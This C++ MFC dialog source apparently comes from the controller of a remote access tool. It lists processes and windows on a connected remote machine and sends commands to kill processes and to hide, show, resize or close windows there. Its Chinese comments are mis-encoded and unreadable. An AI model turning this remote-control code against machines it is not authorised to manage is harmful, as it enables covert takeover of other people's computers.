// SystemDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Remote.h"
#include "SystemDlg.h"
#include "afxdialogex.h"
#include "Common.h"


// CSystemDlg �Ի���

IMPLEMENT_DYNAMIC(CSystemDlg, CDialog)

enum                  
{
	COMMAND_WINDOW_CLOSE,   //�رմ���
	COMMAND_WINDOW_TEST,    //��������
};
CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSystemDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;        //����һ����ֵûʲô�ر�����ǵ�oninitdialog
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SYSTEM));
	//�����ж��Ǵ��ڹ����ǽ��̹�����Ϊ���̹��������ͷ��TOKEN_PSLIST
	//���ڹ��������ͷTOKEN_WSLIST  ���ǿ���������������ͷ������
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(0));
	m_bHow=lpBuffer[0];   
}

CSystemDlg::~CSystemDlg()
{
}

void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST_PROCESS, m_list_process);
}


void CSystemDlg::OnClose()
{
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	CDialog::OnClose();
}


void CSystemDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	AdjustList();
	// TODO: �ڴ˴������Ϣ����������
}


void CSystemDlg::OnReceiveComplete(void)
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}


void CSystemDlg::ShowWindowsList(void)
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	bool isDel=false;
	do 
	{
		isDel=false;
		for (int j=0;j<m_list_process.GetItemCount();j++)
		{
			CString temp=m_list_process.GetItemText(j,2);
			CString restr="����";
			if (temp!=restr)
			{
				m_list_process.DeleteItem(j);
				isDel=true;
				break;
			}
		}

	} while (isDel);
	CString	str;
	int i ;
	for ( i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD);
		str.Format("%5u", *lpPID);
		m_list_process.InsertItem(i, str);
		m_list_process.SetItemText(i, 1, lpTitle);
		m_list_process.SetItemText(i, 2, "��ʾ"); //(d) ������״̬��ʾΪ "��ʾ"
		// ItemData Ϊ���ھ��
		m_list_process.SetItemData(i, *lpPID);  //(d)
		dwOffset += sizeof(DWORD) + lstrlen(lpTitle) + 1;
	}
	str.Format("�������� / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(1, &lvc);

}


void CSystemDlg::ShowProcessList(void)
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)); 
	char	*strExeFile;
	char	*strProcessName;
	DWORD	dwOffset = 0;
	CString str;
	m_list_process.DeleteAllItems();       
	//������������ÿһ���ַ��������������ݽṹ�� Id+������+0+������+0
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);        //����õ�����ID
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);      //����������ID֮�����
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;  //���������ǽ�����֮�����
		//�������ݽṹ�Ĺ���������

		m_list_process.InsertItem(i, strExeFile);       //���õ������ݼ��뵽�б���
		str.Format("%5u", *lpPID);
		m_list_process.SetItemText(i, 1, str);
		m_list_process.SetItemText(i, 2, strProcessName);
		// ItemData Ϊ����ID
		m_list_process.SetItemData(i, *lpPID);

		dwOffset += sizeof(DWORD) + lstrlen(strExeFile) + lstrlen(strProcessName) + 2;   //����������ݽṹ ������һ��ѭ��
	}

	str.Format("����·�� / %d", i); 
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_list_process.SetColumn(2, &lvc); //���б�����ʾ�ж��ٸ�����
}




BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	ON_COMMAND(IDM_KILLPROCESS, &CSystemDlg::OnKillprocess)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_PROCESS, &CSystemDlg::OnNMRClickListProcess)
	ON_COMMAND(IDM_REFRESHPSLIST, &CSystemDlg::OnRefreshpslist)
	ON_COMMAND(ID_WINDOW_REFLUSH, &CSystemDlg::OnWindowReflush)
	ON_COMMAND(ID_WINDOW_CLOSE, &CSystemDlg::OnWindowClose)
	ON_COMMAND(ID_WINDOW_HIDE, &CSystemDlg::OnWindowHide)
	ON_COMMAND(ID_WINDOW_RETURN, &CSystemDlg::OnWindowReturn)
	ON_COMMAND(ID_WINDOW_MAX, &CSystemDlg::OnWindowMax)
	ON_COMMAND(ID_WINDOW_MIN, &CSystemDlg::OnWindowMin)
	ON_WM_CLOSE()
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CSystemDlg ��Ϣ�������


BOOL CSystemDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen); //�õ����ӵ�ip 
	str.Format("\\\\%s - ϵͳ����", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");  
	SetWindowText(str);//���öԻ������

	if (m_bHow==TOKEN_PSLIST)      //���̹����ʼ���б�
	{
		m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //��ʼ�����̵��б�
		m_list_process.InsertColumn(0, "ӳ������", LVCFMT_LEFT, 100);
		m_list_process.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
		m_list_process.InsertColumn(2, "����·��", LVCFMT_LEFT, 400);
		ShowProcessList();   //���ڵ�һ������������Ϣ��������Ž��̵��������԰�������ʾ���б���
	}else if (m_bHow==TOKEN_WSLIST)//���ڹ����ʼ���б�
	{
		m_list_process.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);  //��ʼ�� ���ڹ�����б�
		m_list_process.InsertColumn(0, "PID", LVCFMT_LEFT, 50);
		m_list_process.InsertColumn(1, "��������", LVCFMT_LEFT, 300);
		m_list_process.InsertColumn(2, "����״̬", LVCFMT_LEFT, 300);
		ShowWindowsList();
	}
	AdjustList();
	

	return TRUE;  
	
}



void CSystemDlg::AdjustList(void)
{
	if (m_list_process.m_hWnd==NULL)
	{
		return;
	}
	RECT	rectClient;
	RECT	rectList;
	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 0;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom;

	m_list_process.MoveWindow(&rectList);
}




void CSystemDlg::OnNMRClickListProcess(NMHDR *pNMHDR, LRESULT *pResult)    //ѡ���� �Ҽ������˵�
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	CMenu	popup;
	if (m_bHow==TOKEN_PSLIST)      //���̹����ʼ���б�
	{
		popup.LoadMenu(IDR_PROCESS_LIST);
	}else if (m_bHow==TOKEN_WSLIST)
	{
		popup.LoadMenu(IDR_WINDOW_LIST);
	}
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);
	*pResult = 0;
	*pResult = 0;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////���̹���
void CSystemDlg::OnRefreshpslist()
{
	if (m_list_process.IsWindowVisible())
	{
		GetProcessList();
	}
}

void CSystemDlg::GetProcessList(void)
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::OnKillprocess()
{
	CListCtrl	*pListCtrl = NULL;
	if (m_list_process.IsWindowVisible())
		pListCtrl = &m_list_process;
	else
		return;
	//���仺����
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	//����������̵�����ͷ
	lpBuffer[0] = COMMAND_KILLPROCESS; 
	//��ʾ������Ϣ
	char *lpTips = "����: ��ֹ���̻ᵼ�²�ϣ�������Ľ����\n"
		"�������ݶ�ʧ��ϵͳ���ȶ����ڱ���ֹǰ��\n"
		"���̽�û�л��ᱣ����״̬�����ݡ�";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%sȷʵ\n����ֹ��%d�������?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%sȷʵ\n����ֹ���������?", lpTips);
	}
	if (::MessageBox(m_hWnd, str, "���̽�������", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;

	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); 
	//�õ�Ҫ�����ĸ�����
	while(pos) 
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	//�������ݵ����ض��ڱ��ض��в���COMMAND_KILLPROCESS�������ͷ
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////���̹���


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////���ڹ���

void CSystemDlg::OnWindowReflush()
{
	GetWindowsList();
}


void CSystemDlg::GetWindowsList(void)
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}


void CSystemDlg::OnWindowClose()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem>=0)
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;           //ע������������ǵ�����ͷ
		DWORD hwnd = pListCtrl->GetItemData(nItem); //�õ����ڵľ��һͬ����
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	

	}
}


void CSystemDlg::OnWindowHide()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem>=0)
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;             //���ڴ�������ͷ
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //�õ����ڵľ��һͬ����
		pListCtrl->SetItemText(nItem,2,"����");      //ע����ʱ���б��е���ʾ״̬Ϊ"����"
		//������ɾ���б���Ŀʱ�Ͳ�ɾ�������� ���ɾ������ھ���ᶪʧ ����ԶҲ������ʾ��
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));      //�õ����ڵľ��һͬ����
		DWORD dHow=SW_HIDE;                          //���ڴ������ 0
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	

	}
}


void CSystemDlg::OnWindowReturn()
{
	BYTE lpMsgBuf[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem>=0)
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem,2,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_RESTORE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	

	}
}


void CSystemDlg::OnWindowMax()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem>=0)
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;     //ͬ��
		DWORD hwnd = pListCtrl->GetItemData(nItem);  //ͬ��
		pListCtrl->SetItemText(nItem,2,"��ʾ");   //��״̬��Ϊ��ʾ
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MAXIMIZE;     //ͬ��
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	

	}
}


void CSystemDlg::OnWindowMin()
{
	// TODO: �ڴ���������������
	BYTE lpMsgBuf[20];
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_list_process;

	int	nItem = pListCtrl->GetSelectionMark();
	if (nItem>=0)
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = pListCtrl->GetItemData(nItem);
		pListCtrl->SetItemText(nItem,2,"��ʾ");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MINIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	

	}
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////���ڹ���




